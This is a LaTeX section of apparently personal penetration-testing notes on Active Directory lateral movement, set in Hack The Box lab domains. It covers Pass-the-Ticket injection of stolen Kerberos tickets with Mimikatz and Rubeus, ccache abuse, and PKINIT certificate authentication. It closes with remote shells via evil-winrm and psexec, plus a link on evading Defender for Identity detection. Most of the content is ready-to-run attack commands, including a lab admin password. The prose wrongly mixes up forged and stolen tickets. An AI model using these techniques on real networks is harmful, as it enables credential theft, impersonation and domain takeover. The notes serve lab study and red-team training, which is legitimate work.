\section{Lateral mouvement}
\subsection{Pass the ticket}
\label{network:kerberos:ptt}
In  this attack, the threat actor creates a fake session key by forging a  fake
TGT. The attacker will present this to the service as a valid  credential.

In order to execute this attack, the attacker must obtain access to the
session key. To perform this attack, an attacker  would obtain Kerberos tickets
from the memory of the LSASS process, and  then inject the stolen TGT into
their own session, which will let them  adopt the identity and privileges of
the stolen TGT.


\subsubsection{Ticket conversion}

\begin{verbatim}
# Windows -> UNIX
ticketConverter.py $ticket.kirbi $ticket.ccache

# UNIX -> Windows
ticketConverter.py $ticket.ccache $ticket.kirbi
\end{verbatim}


\subsubsection{On windows}

\begin{verbatim}
 kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# base64 
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))

Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
\end{verbatim}


\subsubsection{Windows remoting}
after injecting ticket
\begin{verbatim}
Enter-PSSession -ComputerName <Name>
\end{verbatim}

\subsubsection{On linux}

Most attack tools support kerberos by default.

\subsection{Abusing ccache}

requiere read permission

\begin{verbatim}
$ export KRB5CCNAME=<ccache file>
\end{verbatim}




\url{https://www.hackingarticles.in/lateral-movement-pass-the-ticket-attack/}

\url{https://www.hackingarticles.in/kerberoasting-and-pass-the-ticket-attack-using-linux/}

\url{https://www.hackingarticles.in/lateral-movement-pass-the-ccache/}

\subsubsection{From Windows}

ticket are exported using either mimikatz or rubeus

\subsubsection{From Linux}


\subsection{pkinit}

\begin{itemize}
    \item \href{https://0xdf.gitlab.io/2022/01/29/htb-anubis.html}{HTB Anubis}
    \item \href{https://www.synacktiv.com/publications/understanding-and-evading-microsoft-defender-for-identity-pkinit-detection}{Understanding and evading Microsoft Defender for Identity PKINIT detection}
\end{itemize}


\verb+/etc/krb5.conf+:
\begin{verbatim}
    [realms]
    ...SNIP....
    DEV.INLANEFREIGHT.AD = {kdc = dc02.dev.inlanefreight.ad}

\end{verbatim}

\begin{verbatim}
proxychains ldeep ldap -t simple -u Administrator -p 'HTB_@cademy_adm!' \
    -s ldap://dc02.dev.inlanefreight.ad  -d dev.inlanefreight.ad \
    -b 'CN=Public Key Services,CN=Services,CN=Configuration,DC=INLANEFREIGHT,DC=AD' \
    search '(objectClass=pKIEnrollmentService)' cACertificate
\end{verbatim}

save in file:
\begin{verbatim}
-----BEGIN CERTIFICATE-----
MIIDgTCCAmmgAwIBAgIQKFIQ8raidL5P81FPay...SNIP...
-----END CERTIFICATE-----
\end{verbatim}


\verb+/etc/krb5.conf+:
\begin{verbatim}
    [realms]
    INLANEFREIGHT.AD = {
        kdc = dc01.inlanefreight.ad
        pkinit_anchors = FILE:/<path>/ca.pem
        pkinit_eku_checking = kpServerAuth
        pkinit_kdc_hostname = dc01.inlanefreight.ad
        pkinit_identities = FILE:/<path>/cert.pem,/<path>/key.pem
}

\end{verbatim}


\begin{verbatim}
# realm is key sensitive
proxychains kinit -V Administrator@INLANEFREIGHT.AD

# proxychains kinit -V -X X509_user_identity=FILE:admin.cer,admin.key administrator@WINDCORP.HTB
# KRB5_TRACE=/dev/stdout proxychains kinit -V
$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: Administrator@INLANEFREIGHT.AD

Valid starting       Expires              Service principal
06/20/2024 13:19:52  06/20/2024 23:19:52  krbtgt/INLANEFREIGHT.AD@INLANEFREIGHT.AD
        renew until 06/21/2024 13:19:40

\end{verbatim}


\begin{verbatim}
proxychains  evil-winrm -i dc01.inlanefreight.ad -r inlanefreight.ad

export KRB5CCNAME=/tmp/krb5cc_1000
proxychains psexec.py -no-pass -k  dc01.inlanefreight.ad
\end{verbatim}


\href{https://www.firecompass.com/blog/the-art-of-keytab-files/}{The Art of Keytab Files}